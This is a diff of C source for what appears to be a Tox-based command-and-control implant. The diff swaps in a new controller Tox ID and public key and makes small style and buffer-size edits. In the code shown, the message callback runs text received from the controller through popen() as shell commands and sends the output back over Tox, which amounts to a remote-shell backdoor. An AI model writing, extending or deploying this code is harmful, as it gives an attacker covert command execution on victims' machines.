@@ -3,7 +3,6 @@
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/utsname.h>
 #include <unistd.h>
 
 #include <sodium/utils.h>
@@ -25,10 +24,10 @@ typedef struct DHT_node {
     const char key_hex[TOX_PUBLIC_KEY_SIZE*2 + 1];
 } DHT_node;
 
-char *c2id = "10121107AA4F1842A2D641E1E55FA7612189F558C6790BB4196D913B8820182949B28C7FD69F"; // "TOX-ID"
-char *c2pub = "10121107AA4F1842A2D641E1E55FA7612189F558C6790BB4196D913B88201829"; // "PUB-KEY"
+char *c2id = "579AE8D0785FD92E6EF77ACD0A993256C13F60D6435BE70C93CEFA9DD73E0321726BB5CF4D98"; // "TOX-ID"
+char *c2pub = "579AE8D0785FD92E6EF77ACD0A993256C13F60D6435BE70C93CEFA9DD73E0321"; // "PUB-KEY"
 
-uint8_t * hex2bin(const char *hex) {
+uint8_t *hex2bin(const char *hex) {
     size_t len = strlen(hex) / 2;
     uint8_t *bin = malloc(len);
     for (size_t i = 0; i < len; ++i, hex += 2) {
@@ -37,11 +36,11 @@ uint8_t * hex2bin(const char *hex) {
     return bin;
 }
 
-char * bin2hex(const uint8_t *bin, size_t length) {
-    char *hex = malloc(2 * length + 1);
+char *bin2hex(const uint8_t *bin, size_t length) {
+    char *hex = malloc(2*length + 1);
     char *saved = hex;
-    for (int i = 0; i < length; i++, hex += 2) {
-        sprintf(hex, "%02X", bin[i]);
+    for (int i=0; i<length;i++,hex+=2) {
+        sprintf(hex, "%02X",bin[i]);
     }
     return saved;
 }
@@ -63,7 +62,7 @@ void friend_message_cb(Tox *tox, uint32_t friend_num, TOX_MESSAGE_TYPE type, con
         uint8_t path[TOX_MAX_MESSAGE_LENGTH];
         fp = popen(cmd, "r");
 
-        while (fgets(path, sizeof(path) - sizeof(admin) - 1, fp) != NULL) {
+        while (fgets(path, sizeof(path) - (strlen(admin) + 1), fp) != NULL) {
             strcat(path, admin);
             tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, path, strlen(path), NULL);
         }
